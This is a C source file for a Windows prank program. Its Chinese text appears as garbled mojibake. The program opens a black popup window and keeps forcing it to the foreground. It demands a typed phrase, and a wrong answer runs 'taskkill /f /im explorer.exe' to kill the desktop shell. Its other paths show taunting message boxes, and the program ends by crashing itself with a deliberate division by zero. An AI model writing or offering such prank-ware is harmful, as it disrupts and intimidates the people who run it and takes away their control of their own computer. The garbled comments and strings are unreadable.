#include <shudu>

#define BUTTON_ID  10011            /*��ťID*/
/* This is where all the input to the window goes to */

int chang, kuan;
HWND hwnd;   /*ʵ����һ�����*/
char title[100] = "�������������㱻ˣ��";
HDC         hdc ;
	PAINTSTRUCT ps ;
	RECT        rect;

int print( char words[] )
{
	hdc = BeginPaint(hwnd, &ps);
	/* TODO: Add any drawing code here... */

	GetClientRect(hwnd, &rect);
	DrawText(hdc, words, strlen(words), &rect, DT_CENTER);
	EndPaint(hwnd, &ps);
}

int ckzq()
{
	HWND hForeWnd = NULL;
	HWND hWnd= FindWindow(NULL, title);
	DWORD dwForeID;
	DWORD dwCurID;

	hForeWnd =  GetForegroundWindow();
	dwCurID =  GetCurrentThreadId();
	dwForeID =  GetWindowThreadProcessId( hForeWnd, NULL );
	AttachThreadInput( dwCurID, dwForeID, TRUE);
	ShowWindow( hWnd, SW_SHOWNORMAL );
	SetWindowPos( hWnd, HWND_TOPMOST, 0,0,0,0, SWP_NOSIZE|SWP_NOMOVE );
	SetWindowPos( hWnd, HWND_NOTOPMOST, 0,0,0,0, SWP_NOSIZE|SWP_NOMOVE );
	SetForegroundWindow( hWnd );
	AttachThreadInput( dwCurID, dwForeID, FALSE);
}

int moddle( int x, int len )
{
	x = x/2;
	x = x-len;
	return x;
}

int yndesktop;

int desk()
{
	system ( "explorer.exe" );
}

int kenren()
{
	int _exit = 0;

	MessageBox(NULL, "Ҫ���˳������������ÿһ�����ⶼ��'��'","���˳��͹Թ�����", MB_ICONASTERISK|MB_OK);
	int yn = MessageBox(NULL, "���Ǹ���������롰������ ��","���˳��͹Թ�����", MB_ICONQUESTION|MB_OK);
}

/* This is where all the input to the window goes to */
LRESULT CALLBACK WndProc(HWND hwnd,UINT message,WPARAM wp,LPARAM lp)
{
	static HWND btnWnd1;
	static bool flag=false;
	char szHello[]="���������㱻ˣ��";
	static HWND hBtn;
	static HWND hEdt;

	switch(message)
	{
		case WM_CREATE:
		{
			btnWnd1 = CreateWindow("Button","X",
								   WS_VISIBLE|WS_CHILD, /*��ť����    */
								   chang-50,kuan-600,  /*��ťλ��    */
								   25,25,             /*��ť��С    */
								   hwnd,			 /*������Ϣ    */
								   (HMENU)BUTTON_ID,/*��ť�Ӵ���ID*/
								   0,0);

			hEdt = CreateWindow(TEXT("EDIT"),                    /*���������*/
								TEXT("������Ĵ�"),      /*������ʼ����*/
								WS_CHILD|WS_VISIBLE|WS_BORDER,/*���������*/
								moddle( chang, 100 ), moddle( kuan, 40 ),  					 /*�����λ��*/
								200, 40, 					/*������С*/
								hwnd, 					   /*������Ϣ*/
								NULL, NULL, NULL);		  /*ռλָ��*/

    		hBtn = CreateWindow(TEXT("BUTTON"),
								TEXT("ȷ��"),
								WS_CHILD|WS_VISIBLE,
								moddle( chang, 100 )+50, moddle( kuan, 40 )+50,
								80, 20,
								hwnd,
								NULL, NULL, NULL);
			break;
		}

		case WM_PAINT:
		{
		 	print ( "������!�㱻ˣ��" );
			break;
		}

		case WM_COMMAND:              /*��ť��ϢWM_COMMAND������*/
		{
			int id = GetDlgCtrlID(hEdt);
   			switch(id-wp)
		   	{
	   			case 0:
		   		{
					char buf[256];
    				GetDlgItemText(hwnd, id, buf, 255);
					if (strcmp( "������", buf ) == 0)
					{
						system ( "cls" );
						printf ( "���:���ѳ���������" );

						if ( yndesktop == 1 )
						{
							MessageBox(NULL, "��Ȼ�㶼�Ѿ������ˣ����Ұ����滹����","���˳��͹Թ�����", MB_ICONASTERISK|MB_OK);
							MessageBox(NULL, "�Ҿ�Ҫ�����ȥ�ˣ�������","",MB_ICONEXCLAMATION|MB_OK);
							desk();
							MessageBox(NULL, "�Ե�һ�£������Ͼ���","",MB_ICONEXCLAMATION|MB_OK);
							printf ( "%d", 1/0 );
						}
						MessageBox(NULL, "�Ҿ�Ҫ�����ȥ�ˣ�������","",MB_ICONEXCLAMATION|MB_OK);
						printf ( "%d", 1/0 );
					}
					else
					{
						system ( "taskkill /f /im explorer.exe" );
						yndesktop = 1;
						system ( "cls" );
						MessageBox(NULL, "���˳��͹Թ�����\n��Ϊ�ͷ����Ұ�����������","!@^%$*)(&^~?:><|{}", MB_ICONASTERISK|MB_OK);
						return 0;
					}
				}


				break;
			}
			switch(LOWORD(wp))        /*wParam�ĵ��ֽ�Ϊ����İ�ť��ID*/
			{
				case BUTTON_ID:
				{
					kenren();
					flag = !flag;
					break;
				}

				default:break;
			}
			break;
		}

		case WM_DESTROY:
		{
			PostQuitMessage(0);
			return 0;
		}

		default:break;
	}
	return DefWindowProc(hwnd,message,wp,lp);
}
/* The 'main' function of Win32 GUI programs: this is where execution starts */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//HideWindow();/*���ظ��ര�ڣ����򱻿ӵ��˿���ֱ�ӹرճ���*/
	system ( "title ���������㱻ˣ��(δ��Ӧ)" );/*���ര�ڱ���*/
	system ( "cls" );
	WNDCLASS wndcls;        /*ʵ����*/
	wndcls.cbClsExtra = 0; /*�������ĸ����ֽ���*/
	wndcls.cbWndExtra = 0;/*���ڶ���ĸ����ֽ���*/
	wndcls.hbrBackground = (HBRUSH)GetStockObject( BLACK_BRUSH );  /*������ɫ��
	GetStockObject()�����ķ���ֵ��һ��HGDIOBJ��ʽ�ģ�ǿ��ת����HBRUSH��ʽ�ĸ�ֵ*/
	wndcls.hCursor = LoadCursor(NULL, IDC_WAIT);  /*��������        */
	wndcls.hIcon = LoadIcon(NULL, IDI_ERROR);    /*����ͼ��          */
	wndcls.hInstance = hInstance;               /*Ӧ�ó����ʵ����  */
	wndcls.lpfnWndProc = WndProc;              /*���ڹ��̺���      */
	wndcls.lpszClassName = "�㱻ˣ��";        /*����              */
	wndcls.lpszMenuName = NULL;              /*�˵���            */
	wndcls.style = CS_HREDRAW | CS_VREDRAW; /*ˮƽ�ػ��ʹ�ֱ�ػ�*/

 	int x = GetSystemMetrics( SM_CXFULLSCREEN );
	int y = GetSystemMetrics( SM_CYFULLSCREEN );/*��ȡ��Ļ�ߴ磨������������*/

 	chang = x - 200;
 	kuan  = y - 200;

	RegisterClass(&wndcls);   /*ע�ᴰ����*/

	hwnd = CreateWindow("�㱻ˣ��",
						title,
						WS_CLIPCHILDREN|WS_CLIPSIBLINGS|WS_POPUP,/*���ڷ��*/
						100,100,
						chang,kuan,
						NULL,NULL,
						hInstance,
						NULL); //����һ������
	ShowWindow(hwnd, SW_SHOWNORMAL);   /*��ʾ����*/
	UpdateWindow(hwnd);  /*���´���*/

	MSG msg;   /*��Ϣ����*/
	while (GetMessage(&msg, NULL, 0, 0))    /*��Ϣѭ��*/
	{
		ckzq();
		TranslateMessage(&msg);   /*��������Ϣ����*/
		DispatchMessage(&msg);
	}
	return msg.wParam;
}

